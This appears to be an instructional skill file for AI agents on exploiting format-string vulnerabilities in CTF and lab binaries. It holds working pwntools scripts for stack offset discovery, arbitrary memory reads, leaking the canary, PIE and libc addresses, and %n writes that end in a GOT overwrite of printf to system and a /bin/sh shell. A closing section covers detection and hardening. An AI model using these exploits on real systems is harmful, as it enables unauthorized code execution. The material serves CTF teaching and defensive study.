---
name: ctf-pwn-basics-format-strings
description: Use when a CTF pwn challenge or authorized lab binary passes
  attacker-controlled input to printf (or syslog, sprintf, fprintf) as the
  format string. Covers finding your stack offset with positional
  parameters, reading arbitrary memory with %s and %p, leaking canaries,
  PIE bases, libc and stack addresses, writing memory with %n variants, and
  automating payloads with pwntools fmtstr_payload. Use when output echoes
  %x or %p probes, when you need an info leak to defeat PIE or ASLR, or
  when a GOT overwrite is the intended path.
version: 1.0.0
domain: ctf
lifecycle: stable
last_verified: 2026-10-23
parent: ctf-pwn-basics
requires: [ctf-pwn-basics]
extends: []
relates: [pwn-fundamentals, ctf-pwn-basics]
tools:
  - name: pwntools
    version: 4.13
  - name: GDB
    version: 15.2
  - name: Python
    version: 3.12
---

A format string vulnerability happens when user input is used as the format
argument to `printf` and friends, so specifiers like `%x`, `%s`, and `%n`
operate on stack memory the programmer never intended to expose. In CTF pwn
this is the premier info-leak primitive: one bug can reveal the canary, the
PIE base, libc addresses, and stack addresses, and `%n` turns the same bug
into arbitrary memory writes. This sub-skill covers the authorized
methodology end to end: offset discovery, arbitrary reads, multi-target
leaks, and reliable `%n` writes with pwntools. Scope is CTF competitions,
labs, and explicitly authorized targets only.

## Quick Workflow

1. Confirm the bug: send `%p.` repeated or `AAAA %x %x %x` and check
   whether hex values or your marker echo back.
2. Find your positional offset: send `AAAA.<k>$p` for increasing k until
   `0x41414141` appears in the output.
3. Dump the stack with repeated `%<k>$p` to map what sits at each
   position (canary-like values, libc pointers, code pointers).
4. Build an arbitrary read: place a target address in the input, then
   `%<offset>$s` to dereference it.
5. Leak what the exploit needs: canary (if present), PIE base (return
   address on stack), libc base (a libc pointer), stack address.
6. For writes, decide the value size: `%hhn` for byte writes (safest),
   `%hn` for 2 bytes, `%n` for 4 bytes.
7. Generate the write payload with pwntools `fmtstr_payload`, or hand
   craft with width specifiers, and verify each write in gdb.
8. Chain the primitives: leak first, compute addresses, then write (for
   example GOT overwrite of `printf` to `system`).

## 1. Offset discovery and stack mapping

Positional parameters (`%6$p`) read the Nth stack slot as an argument. Find
which slot holds your input, then map neighbors.

```bash
# Marker probe: find which position echoes 0x41414141
for i in $(seq 1 30); do
  out=$(printf "START.%s\$p.END" "$i" | ./vuln)
  echo "$i: $out"
done
# example hit: 6: START.0x41414141.END  -> offset 6
```

```bash
# Dump 30 stack slots in one run to map the neighborhood
python3 -c "print('.'.join('%'+str(i)+'\$p' for i in range(1,31)))" | ./vuln
# sample output shape:
# 0x7ffd...00.0x55....10.0x7f....20.(nil).0x1.0x41414141.0x252e3824...
```

Learn to recognize pointer shapes: `0x55...` is PIE code, `0x7f...` is
libc or mmap, `0x7ffd...` is stack, small values are counters or canary
fragments. A value ending in `...00` with high entropy in the middle is
often the stack canary.

## 2. Arbitrary read with %s

Place the address you want to read inside your input, then use `%<k>$s`
where k is the position of your input.

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
OFFSET = 6  # from probing

def read_mem(io, addr):
    # layout: [format string][padding][address at known position]
    payload = f"%{OFFSET}$s.".encode().ljust(24) + p64(addr)
    io.sendline(payload)
    io.recvuntil(b".")
    data = io.recvuntil(b".", drop=True)
    return data

io = process("./vuln")
# read the GOT entry for puts -> leaks libc address of puts
io.sendline(f"%{OFFSET}$s.".encode().ljust(24) + p64(elf.got["puts"]))
io.recvuntil(b"Enter input: ")
leak = io.recvuntil(b".", drop=True)
puts_addr = u64(leak.ljust(8, b"\x00"))
print(f"puts@{hex(puts_addr)}")
```

Watch for: the target memory must be a readable NUL-terminated string
region for `%s`; unreadable addresses crash the program (fine, restart and
adjust). Some programs print a fixed prefix you must `recvuntil` past.

## 3. Leaking canary, PIE base, and libc base

One format string bug usually yields every leak the exploit needs.

```python
# Canary: often a stack slot near your input with a zero low byte
# Probe candidate slots with %<k>$p and look for 0x??...??00 with high entropy
# Then confirm: overwrite attempt with wrong canary crashes, right one passes.

# PIE base: leak a saved return address (points into the binary's .text)
# code_leak = 0x555555554000 + 0x12a9  ->  pie_base = code_leak - 0x12a9
# Find the offset of main's return by disassembling _start -> __libc_start_main call.

# libc base: leak any GOT entry or a libc pointer from the stack
# libc.address = puts_leak - libc.symbols["puts"]
```

Concrete pwntools pattern for a combined leak:

```python
def fmt_leak(io, fmt):
    io.sendline(fmt)
    io.recvuntil(b"> ")
    return io.recvline().strip()

# dump slots 1..40 as integers in one helper loop, parse with int(x, 16)
slots = {}
for k in range(1, 41):
    val = fmt_leak(io, f"%{k}$p".encode())
    try:
        slots[k] = int(val, 16)
    except ValueError:
        pass
for k, v in slots.items():
    tag = ""
    if (v >> 40) == 0x55: tag = "PIE?"
    elif (v >> 40) == 0x7F: tag = "libc/mmap?"
    elif (v >> 40) == 0x7FFD or (v >> 40) == 0x7FFE: tag = "stack?"
    print(f"slot {k}: {hex(v)} {tag}")
```

## 4. Arbitrary write with %n

`%n` writes the number of characters printed so far to the pointed-to
address. Control the count with width specifiers (`%1234c` prints 1234
chars), and use `%hhn` to write a single byte, which avoids huge outputs.

```bash
# Manual concept: write 0x41 ('A') to target using %hhn at position 10
# payload: "%64c%10$hhn" + padding + p64(target)
# %64c prints 64 chars, so the byte 0x40 is written; adjust width per byte.
python3 -c "
from pwn import *
elf = ELF('./vuln')
# write 0x34 to elf.got['printf'] low byte, assuming offset 10
p = b'%52c%10\$hhn.' + b'A'*8 + p64(elf.got['printf'])
open('/tmp/fmtw','wb').write(p)"
```

pwntools automates multi-byte writes, splitting values into byte writes
and sorting them to keep the printed count monotonic:

```python
from pwn import *
elf = ELF("./vuln")

# overwrite printf@got with system address (Full RELRO off / Partial RELRO)
writes = {elf.got["printf"]: libc.symbols["system"]}
payload = fmtstr_payload(6, writes, write_size="byte")
# write_size="byte" uses %hhn: slower but avoids 4GB width specifiers
io.sendline(payload)
# now calling printf("/bin/sh") actually calls system("/bin/sh")
io.sendline(b"/bin/sh")
```

Always verify writes in gdb: break after the `printf` call and check
`x/gx <got_entry>` before trusting the payload.

## 5. GOT overwrite to system: the classic chain

With Partial RELRO (GOT writable), redirect a commonly called function:

1. Leak libc via `%<k>$s` on a GOT entry (section 2).
2. Compute `libc.address` and `system` address.
3. `fmtstr_payload(offset, {elf.got["printf"]: system})`.
4. Trigger `printf` with `/bin/sh` as its format string argument.

```python
io.sendline(payload)          # performs the GOT overwrite
io.recvuntil(b"> ")
io.sendline(b"/bin/sh")       # program calls printf("/bin/sh") -> system("/bin/sh")
io.interactive()
```

If the program calls `printf` with no arguments after the overwrite, the
format string you send IS the argument, which is exactly what you want.

## Edge cases

- The program appends a newline or prefix to your input: account for the
  extra bytes in the offset, or the address you planted shifts position.
- `%n` is blocked by FORTIFY_SOURCE (`%n` in writable memory aborts):
  check the binary; if blocked, use the leak-only path plus a different
  write primitive.
- Input is truncated at a fixed length: keep the address planting compact
  (short format string, address at the very start) or do the leak in one
  connection and the write in another.
- 32-bit targets: addresses are 4 bytes, use `%<k>$x` style probing the
  same way, and `p32` for planted addresses.
- The output is line-buffered oddly: use `io.recvall()` or read until a
  known prompt instead of `recvline` to avoid hanging.
- Multiple format bugs in one program: use the first for the leak and
  the second for the write, or reuse one bug twice if the program loops.

## Escalation

- No `0x41414141` appears at any position up to 100: the input may be
  copied to the heap (not on the stack), so plant the address and probe
  `%s` anyway, or the program filters `%`.
- `%s` on a GOT address crashes: the address planting is off by a slot;
  re-probe the offset with a fresh marker, watching for off-by-one from
  program-added prefixes.
- `fmtstr_payload` output is too long for the input limit: switch to
  `write_size="short"` (fewer writes, larger widths) or split the write
  across two connections writing 2 bytes each.
- GOT overwrite has no effect: checksec for Full RELRO; if Full, pivot
  to overwriting a function pointer, `__malloc_hook` style targets (on
  older libc), or return-address overwrite via a stack address leak.
- Leaked libc addresses do not match the provided libc: the remote uses
  a different build; leak two symbols and identify the exact libc with a
  libc database before computing `system`.

## Detection and defender view

Defenders see format string probing as inputs full of `%x`, `%p`, `%s`,
`%n`, and positional markers like `%6$p`, often in long repetitive
bursts. A successful leak shows as one oversized response followed by a
shell. The durable fixes are compiling with `-Wformat -Wformat-security
-Werror=format-security` (fails the build on non-literal format strings),
FORTIFY_SOURCE to block `%n` in writable segments, and treating every
`printf(user_input)` as a finding in code review. Runtime monitoring for
`%n` in network input is a cheap high-signal detection.

## Key references

- MITRE ATT&CK T1068 (Exploitation for Privilege Escalation).
- CWE-134 (Use of Externally-Controlled Format String).
- CWE-787 (Out-of-bounds Write): for the `%n` write primitive.
- pwntools `fmtstr_payload` docs: https://docs.pwntools.com/
- OWASP: Format String Attack (testing and remediation notes).
